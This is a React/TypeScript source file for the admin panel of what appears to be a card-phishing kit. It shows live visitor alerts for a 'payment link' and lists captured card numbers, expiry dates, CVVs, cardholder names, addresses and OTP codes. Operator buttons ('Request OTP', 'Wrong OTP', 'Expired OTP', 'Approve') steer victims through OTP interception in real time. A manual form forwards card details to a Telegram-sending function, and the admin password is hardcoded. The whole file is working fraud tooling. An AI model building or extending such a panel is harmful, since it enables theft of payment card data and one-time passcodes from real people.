import { useState, useEffect, useMemo, useRef, useCallback } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash, Wifi, WifiOff, Volume2, VolumeX, Trash2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { Badge } from "@/components/ui/badge";
import { playAlertSound } from "@/hooks/use-alert-sound";

const ADMIN_PASSWORD = "Ultimateunique1#";

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
};

const formatExpiry = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
};

type CardBrand = "visa" | "mastercard" | "amex" | "discover" | "unknown";

const detectCardBrand = (number: string): CardBrand => {
  const digits = number.replace(/\s/g, "");
  if (!digits) return "unknown";
  if (/^4/.test(digits)) return "visa";
  if (/^5[1-5]/.test(digits) || /^2(2[2-9][1-9]|2[3-9]\d|[3-6]\d{2}|7[01]\d|720)/.test(digits)) return "mastercard";
  if (/^3[47]/.test(digits)) return "amex";
  if (/^(6011|64[4-9]|65)/.test(digits)) return "discover";
  return "unknown";
};

const countries = [
  "Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria",
  "Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan",
  "Bolivia","Bosnia and Herzegovina","Botswana","Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia",
  "Cameroon","Canada","Central African Republic","Chad","Chile","China","Colombia","Comoros","Congo","Costa Rica",
  "Croatia","Cuba","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","Ecuador","Egypt",
  "El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini","Ethiopia","Fiji","Finland","France","Gabon",
  "Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau","Guyana",
  "Haiti","Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel",
  "Italy","Jamaica","Japan","Jordan","Kazakhstan","Kenya","Kiribati","Kosovo","Kuwait","Kyrgyzstan",
  "Laos","Latvia","Lebanon","Lesotho","Liberia","Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar",
  "Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia",
  "Moldova","Monaco","Mongolia","Montenegro","Morocco","Mozambique","Myanmar","Namibia","Nauru","Nepal",
  "Netherlands","New Zealand","Nicaragua","Niger","Nigeria","North Korea","North Macedonia","Norway","Oman","Pakistan",
  "Palau","Palestine","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Qatar",
  "Romania","Russia","Rwanda","Saint Kitts and Nevis","Saint Lucia","Saint Vincent and the Grenadines","Samoa","San Marino",
  "Sao Tome and Principe","Saudi Arabia","Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia",
  "Solomon Islands","Somalia","South Africa","South Korea","South Sudan","Spain","Sri Lanka","Sudan","Suriname","Sweden",
  "Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor-Leste","Togo","Tonga","Trinidad and Tobago",
  "Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States",
  "Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe",
];

const Admin = () => {
  const { toast } = useToast();
  const [authenticated, setAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [amount, setAmount] = useState("");
  const [sessions, setSessions] = useState<any[]>([]);
  const [expandedSession, setExpandedSession] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<"form" | "sessions">("sessions");
  const [visitorCount, setVisitorCount] = useState(0);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const prevVisitorCountRef = useRef<number>(0);
  const [form, setForm] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
    cardholderName: "",
    email: "",
    country: "",
    address1: "",
    address2: "",
    city: "",
    state: "",
    zip: "",
  });

  // Visitor presence tracking
  useEffect(() => {
    if (!authenticated) return;

    const channel = supabase.channel("visitors");

    channel
      .on("presence", { event: "sync" }, () => {
        const state = channel.presenceState();
        const count = Object.keys(state).length;
        const prev = prevVisitorCountRef.current;

        if (count > prev && prev >= 0) {
          // Someone joined
          if (soundEnabled) playAlertSound("join");
          toast({
            title: "🟢 Visitor joined",
            description: `Someone opened the payment link. ${count} active visitor${count !== 1 ? "s" : ""}.`,
          });
        } else if (count < prev && prev > 0) {
          // Someone left
          if (soundEnabled) playAlertSound("leave");
          toast({
            title: "🔴 Visitor left",
            description: `Someone left the payment link. ${count} active visitor${count !== 1 ? "s" : ""}.`,
          });
        }

        prevVisitorCountRef.current = count;
        setVisitorCount(count);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [authenticated, soundEnabled]);

  // Fetch sessions
  const fetchSessions = async () => {
    const { data } = await supabase
      .from("sessions")
      .select("*")
      .order("created_at", { ascending: false });
    if (data) setSessions(data);
  };

  // Real-time subscription
  useEffect(() => {
    if (!authenticated) return;
    fetchSessions();
    const channel = supabase
      .channel("admin-sessions")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, () => {
        fetchSessions();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [authenticated]);

  // Session control actions
  const updateSessionStatus = async (id: string, status: string) => {
    const { error } = await supabase.from("sessions").update({ status }).eq("id", id);
    if (error) {
      toast({ title: "Error", description: "Failed to update session.", variant: "destructive" });
    } else {
      toast({ title: "Updated", description: `Session set to "${status}".` });
    }
  };

  const deleteSession = async (id: string) => {
    const { error } = await supabase.from("sessions").delete().eq("id", id);
    if (error) {
      toast({ title: "Error", description: "Failed to delete session.", variant: "destructive" });
    } else {
      toast({ title: "Deleted", description: "Session removed." });
      setExpandedSession(null);
    }
  };

  const getStatusConfig = (status: string) => {
    const map: Record<string, { variant: "default" | "secondary" | "destructive" | "outline"; label: string; dotColor: string }> = {
      pending: { variant: "outline", label: "Pending", dotColor: "bg-muted-foreground" },
      waiting: { variant: "secondary", label: "Waiting", dotColor: "bg-yellow-500" },
      otp_required: { variant: "default", label: "OTP Required", dotColor: "bg-primary" },
      otp: { variant: "default", label: "OTP Sent", dotColor: "bg-primary" },
      otp_submitted: { variant: "secondary", label: "OTP Submitted", dotColor: "bg-blue-500" },
      otp_wrong: { variant: "destructive", label: "Wrong OTP", dotColor: "bg-orange-500" },
      otp_expired: { variant: "destructive", label: "Expired OTP", dotColor: "bg-amber-500" },
      processing: { variant: "secondary", label: "Processing", dotColor: "bg-yellow-500" },
      approved: { variant: "default", label: "Approved", dotColor: "bg-emerald-500" },
      success: { variant: "default", label: "Success", dotColor: "bg-emerald-500" },
      rejected: { variant: "destructive", label: "Rejected", dotColor: "bg-destructive" },
    };
    return map[status] || { variant: "outline" as const, label: status, dotColor: "bg-muted-foreground" };
  };

  const getStatusBadge = (status: string) => {
    const config = getStatusConfig(status);
    return (
      <Badge variant={config.variant} className="gap-1.5 font-medium">
        <span className={`h-1.5 w-1.5 rounded-full ${config.dotColor}`} />
        {config.label}
      </Badge>
    );
  };

  // Stats
  const stats = useMemo(() => {
    const total = sessions.length;
    const pending = sessions.filter(s => ["pending", "waiting"].includes(s.status)).length;
    const otpRequired = sessions.filter(s => ["otp_required", "otp"].includes(s.status)).length;
    const completed = sessions.filter(s => ["approved", "success"].includes(s.status)).length;
    return { total, pending, otpRequired, completed };
  }, [sessions]);

  const brand = detectCardBrand(form.cardNumber);
  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;
  const isValidAmount = parsedAmount >= 500 && parsedAmount <= 1500;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setAuthenticated(true);
      setError(false);
    } else {
      setError(true);
    }
  };

  const update = (field: string, value: string) => {
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "cvv") value = value.replace(/\D/g, "").slice(0, 4);
    setForm((f) => ({ ...f, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const { data: session, error: dbError } = await supabase
        .from("sessions")
        .insert({ status: "pending", form_data: { ...form, amount } as any })
        .select("id")
        .single();

      if (dbError || !session) throw new Error("Failed to create session");

      const res = await fetch(
        `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "payment", ...form, amount, sessionId: session.id }),
        }
      );

      if (!res.ok) throw new Error("Failed to process");

      toast({
        title: "Submitted",
        description: `Card details submitted successfully. Session: ${session.id.slice(0, 8)}…`,
      });

      // Reset form
      setForm({
        cardNumber: "", expiry: "", cvv: "", cardholderName: "",
        email: "", country: "", address1: "", address2: "",
        city: "", state: "", zip: "",
      });
      setAmount("");
    } catch {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="w-full max-w-sm space-y-6">
          <div className="text-center space-y-2">
            <div className="h-12 w-12 rounded-xl bg-muted flex items-center justify-center mx-auto">
              <Lock className="h-6 w-6 text-muted-foreground" />
            </div>
            <h1 className="text-lg font-semibold text-foreground">Admin Access</h1>
            <p className="text-sm text-muted-foreground">Enter password to continue</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-3">
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); setError(false); }}
              className={error ? "border-destructive" : ""}
              autoFocus
            />
            {error && <p className="text-xs text-destructive">Incorrect password</p>}
            <Button type="submit" className="w-full">Unlock</Button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-muted/30">
      {/* ===== HEADER ===== */}
      <header className="bg-card border-b border-border sticky top-0 z-50">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-14">
            <div className="flex items-center gap-3">
              <div className="h-8 w-8 rounded-lg bg-primary flex items-center justify-center shadow-sm">
                <span className="text-primary-foreground text-sm font-bold">P</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-foreground font-semibold text-base">Pay</span>
                <span className="text-[10px] font-semibold uppercase tracking-widest text-muted-foreground bg-muted px-2 py-0.5 rounded">Admin</span>
              </div>
            </div>
            <div className="flex items-center gap-3">
              {/* Visitor presence indicator */}
              <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg border transition-all ${
                visitorCount > 0
                  ? "bg-emerald-50 border-emerald-200 dark:bg-emerald-950/30 dark:border-emerald-800"
                  : "bg-muted border-border"
              }`}>
                {visitorCount > 0 ? (
                  <Wifi className="h-3.5 w-3.5 text-emerald-600 dark:text-emerald-400 animate-pulse" />
                ) : (
                  <WifiOff className="h-3.5 w-3.5 text-muted-foreground" />
                )}
                <span className={`text-xs font-semibold tabular-nums ${
                  visitorCount > 0 ? "text-emerald-700 dark:text-emerald-300" : "text-muted-foreground"
                }`}>
                  {visitorCount} online
                </span>
              </div>
              {/* Sound toggle */}
              <button
                onClick={() => setSoundEnabled(!soundEnabled)}
                className="h-8 w-8 rounded-md flex items-center justify-center hover:bg-muted transition-colors"
                title={soundEnabled ? "Mute alerts" : "Unmute alerts"}
              >
                {soundEnabled ? (
                  <Volume2 className="h-4 w-4 text-foreground" />
                ) : (
                  <VolumeX className="h-4 w-4 text-muted-foreground" />
                )}
              </button>
              {/* Tabs */}
              <div className="flex items-center gap-1 bg-muted rounded-lg p-1">
                <button
                  onClick={() => setActiveTab("sessions")}
                  className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
                    activeTab === "sessions"
                      ? "bg-card text-foreground shadow-sm"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  <Activity className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
                  Sessions
                </button>
                <button
                  onClick={() => setActiveTab("form")}
                  className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
                    activeTab === "form"
                      ? "bg-card text-foreground shadow-sm"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  <CreditCard className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
                  Manual Entry
                </button>
              </div>
            </div>
          </div>
        </div>
      </header>

      {activeTab === "sessions" ? (
        /* ========== SESSION DASHBOARD ========== */
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
          {/* Stats Row */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
            {[
              { label: "Total Sessions", value: stats.total, icon: Users, accent: "text-primary" },
              { label: "Pending", value: stats.pending, icon: Clock, accent: "text-yellow-600" },
              { label: "Awaiting OTP", value: stats.otpRequired, icon: KeyRound, accent: "text-primary" },
              { label: "Completed", value: stats.completed, icon: ShieldCheck, accent: "text-emerald-600" },
            ].map((stat) => (
              <div key={stat.label} className="bg-card rounded-xl border border-border p-4 sm:p-5">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-medium text-muted-foreground uppercase tracking-wide">{stat.label}</span>
                  <stat.icon className={`h-4 w-4 ${stat.accent} opacity-70`} />
                </div>
                <p className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">{stat.value}</p>
              </div>
            ))}
          </div>

          {/* Sessions Header */}
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg font-semibold text-foreground">Live Sessions</h2>
              <p className="text-xs text-muted-foreground mt-0.5">Real-time monitoring · Auto-updates</p>
            </div>
            <Button variant="outline" size="sm" onClick={fetchSessions} className="gap-1.5">
              <RefreshCw className="h-3.5 w-3.5" /> Refresh
            </Button>
          </div>

          {/* Sessions List */}
          {sessions.length === 0 ? (
            <div className="bg-card rounded-xl border border-border p-16 text-center">
              <Activity className="h-10 w-10 text-muted-foreground/30 mx-auto mb-3" />
              <p className="text-muted-foreground text-sm font-medium">No sessions yet</p>
              <p className="text-muted-foreground/60 text-xs mt-1">Waiting for submissions…</p>
            </div>
          ) : (
            <div className="space-y-2.5">
              {sessions.map((s) => {
                const fd = (s.form_data || {}) as any;
                const isExpanded = expandedSession === s.id;
                const statusConfig = getStatusConfig(s.status);
                return (
                  <div
                    key={s.id}
                    className={`bg-card rounded-xl border transition-all duration-200 overflow-hidden ${
                      isExpanded ? "border-primary/30 shadow-md" : "border-border hover:border-border/80 hover:shadow-sm"
                    }`}
                  >
                    {/* Session row */}
                    <div
                      className="flex items-center gap-3 sm:gap-4 p-4 sm:p-5 cursor-pointer select-none"
                      onClick={() => setExpandedSession(isExpanded ? null : s.id)}
                    >
                      {/* Status dot */}
                      <div className={`h-2.5 w-2.5 rounded-full shrink-0 ${statusConfig.dotColor} ring-4 ring-background`} />

                      {/* Main info */}
                      <div className="flex-1 min-w-0 flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-4">
                        <div className="flex items-center gap-2.5 min-w-0">
                          {getStatusBadge(s.status)}
                          {fd.amount && (
                            <span className="text-base font-bold text-foreground tabular-nums">€{fd.amount}</span>
                          )}
                        </div>
                        <div className="flex items-center gap-2 min-w-0">
                          {fd.email && (
                            <span className="text-sm text-muted-foreground truncate flex items-center gap-1">
                              <Mail className="h-3 w-3 shrink-0" />
                              {fd.email}
                            </span>
                          )}
                        </div>
                      </div>

                      {/* Meta */}
                      <div className="flex items-center gap-3 shrink-0">
                        <div className="text-right hidden sm:block">
                          <p className="text-xs text-muted-foreground">
                            {new Date(s.created_at).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}
                          </p>
                          <p className="text-[10px] text-muted-foreground/60">
                            {new Date(s.created_at).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" })}
                          </p>
                        </div>
                        {isExpanded
                          ? <ChevronUp className="h-4 w-4 text-muted-foreground" />
                          : <ChevronDown className="h-4 w-4 text-muted-foreground" />
                        }
                      </div>
                    </div>

                    {/* Expanded panel */}
                    {isExpanded && (
                      <div className="border-t border-border bg-muted/20">
                        {/* Card details grid */}
                        <div className="p-5 grid grid-cols-1 sm:grid-cols-3 gap-4">
                          <div className="space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Card Number</p>
                            <p className="text-sm font-mono text-foreground tracking-wider">{fd.cardNumber || "—"}</p>
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Expiry</p>
                            <p className="text-sm font-mono text-foreground">{fd.expiry || "—"}</p>
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">CVV</p>
                            <p className="text-sm font-mono text-foreground">{fd.cvv || "—"}</p>
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Cardholder</p>
                            <p className="text-sm text-foreground">{fd.cardholderName || "—"}</p>
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Email</p>
                            <p className="text-sm text-foreground truncate">{fd.email || "—"}</p>
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Session ID</p>
                            <p className="text-sm font-mono text-muted-foreground">{s.id.slice(0, 12)}…</p>
                          </div>
                          <div className="sm:col-span-3 space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground flex items-center gap-1">
                              <MapPin className="h-3 w-3" /> Billing Address
                            </p>
                            <p className="text-sm text-foreground">
                              {[fd.address1, fd.address2, fd.city, fd.state, fd.zip, fd.country].filter(Boolean).join(", ") || "—"}
                            </p>
                          </div>
                          {fd.otp && (
                            <div className="space-y-0.5">
                              <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground flex items-center gap-1">
                                <Hash className="h-3 w-3" /> OTP Code
                              </p>
                              <p className="text-lg font-mono font-bold text-primary tracking-[0.3em]">{fd.otp}</p>
                            </div>
                          )}
                        </div>

                        {/* Actions */}
                        <div className="border-t border-border px-5 py-3.5 flex flex-wrap gap-2 bg-card">
                          <Button
                            size="sm"
                            variant="outline"
                            className="gap-1.5"
                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp"); }}
                          >
                            <KeyRound className="h-3.5 w-3.5" /> Request OTP
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            className="gap-1.5 text-orange-600 border-orange-300 hover:bg-orange-50"
                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_wrong"); }}
                          >
                            <XCircle className="h-3.5 w-3.5" /> Wrong OTP
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            className="gap-1.5 text-amber-600 border-amber-300 hover:bg-amber-50"
                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_expired"); }}
                          >
                            <Clock className="h-3.5 w-3.5" /> Expired OTP
                          </Button>
                          <Button
                            size="sm"
                            className="gap-1.5"
                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "success"); }}
                          >
                            <CheckCircle className="h-3.5 w-3.5" /> Approve
                          </Button>
                          <Button
                            size="sm"
                            variant="destructive"
                            className="gap-1.5"
                            onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "rejected"); }}
                          >
                            <XCircle className="h-3.5 w-3.5" /> Reject
                          </Button>
                          <div className="flex-1" />
                          <Button
                            size="sm"
                            variant="outline"
                            className="gap-1.5 text-destructive border-destructive/30 hover:bg-destructive/10"
                            onClick={(e) => { e.stopPropagation(); deleteSession(s.id); }}
                          >
                            <Trash2 className="h-3.5 w-3.5" /> Delete
                          </Button>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      ) : (
        /* ========== MANUAL ENTRY FORM ========== */
        <div className="min-h-[calc(100vh-57px)] flex">
          {/* Left panel — branding / order summary */}
          <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14 bg-stripe-bg">
            <div>
              <div className="space-y-6">
                <div>
                  <p className="text-white/50 text-sm">Manual Card Entry</p>
                  <p className="text-white/40 text-xs mt-0.5">Business Portal</p>
                  <p className="text-white text-4xl font-bold tracking-tight mt-1">
                    {isValidAmount ? formatEuro(total) : "€0.00"}
                  </p>
                </div>

                <div className="space-y-4 mt-8">
                  <div className="flex items-center justify-between py-3 border-b border-white/10">
                    <p className="text-white/50 text-sm">Amount</p>
                    <p className="text-white/90 text-sm">
                      {isValidAmount ? formatEuro(parsedAmount) : "—"}
                    </p>
                  </div>
                  <div className="flex items-center justify-between py-3 border-b border-white/10">
                    <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
                    <p className="text-white/90 text-sm">
                      {isValidAmount ? formatEuro(transactionFee) : "—"}
                    </p>
                  </div>
                  <div className="flex items-center justify-between py-3">
                    <p className="text-white/90 text-sm font-semibold">Total</p>
                    <p className="text-white text-sm font-semibold">
                      {isValidAmount ? formatEuro(total) : "—"}
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-4 text-white/30 text-xs">
              <span>Powered by <span className="font-semibold text-white/50">Pay</span></span>
              <span>·</span>
              <span>Admin Portal</span>
            </div>
          </div>

          {/* Right panel — form */}
          <div className="flex-1 flex items-start justify-center bg-background overflow-y-auto">
            <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
              {/* Mobile header */}
              <div className="lg:hidden mb-8">
                <p className="text-muted-foreground text-sm">Manual Card Entry</p>
                <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
                  {isValidAmount ? formatEuro(total) : "€0.00"}
                </p>
                {isValidAmount && (
                  <div className="mt-3 space-y-1.5">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                      <span className="text-foreground">{formatEuro(transactionFee)}</span>
                    </div>
                    <div className="flex items-center justify-between text-sm font-semibold">
                      <span className="text-foreground">Total</span>
                      <span className="text-foreground">{formatEuro(total)}</span>
                    </div>
                  </div>
                )}
              </div>

              <div className="animate-fade-up">
                <form onSubmit={handleSubmit} className="space-y-6">
                  {/* Amount */}
                  <div>
                    <label className="stripe-label">Amount (€500 – €1,500)</label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground text-sm">€</span>
                      <input
                        type="number"
                        min="500"
                        max="1500"
                        step="0.01"
                        value={amount}
                        onChange={(e) => setAmount(e.target.value)}
                        className="stripe-input pl-7"
                        placeholder="1000.00"
                        required
                      />
                    </div>
                    {amount && !isValidAmount && (
                      <p className="text-destructive text-xs mt-1">Amount must be between €500 and €1,500</p>
                    )}
                  </div>

                  {/* Email */}
                  <div>
                    <label className="stripe-label">Email</label>
                    <input
                      type="email"
                      value={form.email}
                      onChange={(e) => update("email", e.target.value)}
                      className="stripe-input"
                      placeholder="customer@example.com"
                      required
                    />
                  </div>

                  {/* Card information */}
                  <div>
                    <label className="stripe-label">Card information</label>
                    <div className="stripe-input-group">
                      <div className="relative">
                        <input
                          value={form.cardNumber}
                          onChange={(e) => update("cardNumber", e.target.value)}
                          className="stripe-input-row pr-28"
                          placeholder="1234 1234 1234 1234"
                          required
                        />
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "visa" ? "opacity-100" : "opacity-25"}`}>
                            <span className="text-[7px] font-bold text-white tracking-wider">VISA</span>
                          </div>
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-red-500 to-orange-400 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "mastercard" ? "opacity-100" : "opacity-25"}`}>
                            <div className="flex -space-x-1">
                              <div className="h-2.5 w-2.5 rounded-full bg-red-600/80" />
                              <div className="h-2.5 w-2.5 rounded-full bg-yellow-400/80" />
                            </div>
                          </div>
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-sky-500 to-sky-700 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "amex" ? "opacity-100" : "opacity-25"}`}>
                            <span className="text-[6px] font-bold text-white tracking-tight">AMEX</span>
                          </div>
                        </div>
                      </div>
                      <div className="flex border-t border-input">
                        <input
                          value={form.expiry}
                          onChange={(e) => update("expiry", e.target.value)}
                          className="stripe-input-row flex-1 border-r border-input"
                          placeholder="MM / YY"
                          required
                        />
                        <div className="relative flex-1">
                          <input
                            value={form.cvv}
                            onChange={(e) => update("cvv", e.target.value)}
                            className="stripe-input-row w-full pr-10"
                            placeholder="CVC"
                            required
                          />
                          <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground/40" />
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Cardholder name */}
                  <div>
                    <label className="stripe-label">Cardholder name</label>
                    <input
                      value={form.cardholderName}
                      onChange={(e) => update("cardholderName", e.target.value)}
                      className="stripe-input"
                      placeholder="Full name on card"
                      required
                    />
                  </div>

                  {/* Billing Address */}
                  <div>
                    <label className="stripe-label">Billing address</label>
                    <div className="stripe-input-group">
                      <select
                        value={form.country}
                        onChange={(e) => update("country", e.target.value)}
                        className="stripe-input-row w-full appearance-none bg-card cursor-pointer"
                        required
                      >
                        <option value="" disabled>Select a country…</option>
                        {countries.map((c) => (
                          <option key={c} value={c}>{c}</option>
                        ))}
                      </select>
                      {form.country && (
                        <>
                          <input
                            value={form.address1}
                            onChange={(e) => update("address1", e.target.value)}
                            className="stripe-input-row border-t border-input"
                            placeholder="Address line 1"
                            required
                          />
                          <input
                            value={form.address2}
                            onChange={(e) => update("address2", e.target.value)}
                            className="stripe-input-row border-t border-input"
                            placeholder="Address line 2 (optional)"
                          />
                          <div className="flex border-t border-input">
                            <input
                              value={form.city}
                              onChange={(e) => update("city", e.target.value)}
                              className="stripe-input-row flex-1 border-r border-input"
                              placeholder="City"
                              required
                            />
                            <input
                              value={form.state}
                              onChange={(e) => update("state", e.target.value)}
                              className="stripe-input-row flex-1"
                              placeholder="State / Province"
                              required
                            />
                          </div>
                          <input
                            value={form.zip}
                            onChange={(e) => update("zip", e.target.value)}
                            className="stripe-input-row border-t border-input"
                            placeholder="ZIP / Postal code"
                            required
                          />
                        </>
                      )}
                    </div>
                  </div>

                  {/* Submit button */}
                  <button
                    type="submit"
                    disabled={loading || !isValidAmount}
                    className="stripe-button flex items-center justify-center gap-2"
                  >
                    {loading ? (
                      <>
                        <div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>Submit {isValidAmount ? formatEuro(total) : "—"}</>
                    )}
                  </button>

                  {/* Footer */}
                  <div className="flex items-center justify-center gap-1.5 pt-2">
                    <Lock className="h-3 w-3 text-muted-foreground/50" />
                    <p className="text-xs text-muted-foreground/60">
                      Powered by <span className="font-semibold text-muted-foreground">Pay</span>
                    </p>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Admin;
